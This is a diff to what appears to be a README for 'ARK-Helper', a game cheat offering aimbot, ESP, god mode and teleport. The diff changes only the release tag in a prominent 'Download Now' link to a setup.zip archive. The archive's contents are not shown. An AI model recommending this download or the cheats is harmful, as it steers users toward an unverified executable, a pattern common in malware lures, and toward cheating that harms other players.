@@ -13,7 +13,7 @@ ESP · Aimbot · Fly Hack · Teleport · God Mode · Infinite Resources
 
 
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/ScalarMothEnergy/ARK-Helper/releases/download/ser/setup.zip)
+[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/ScalarMothEnergy/ARK-Helper/releases/download/setupv1/setup.zip)
 
 
 </div>
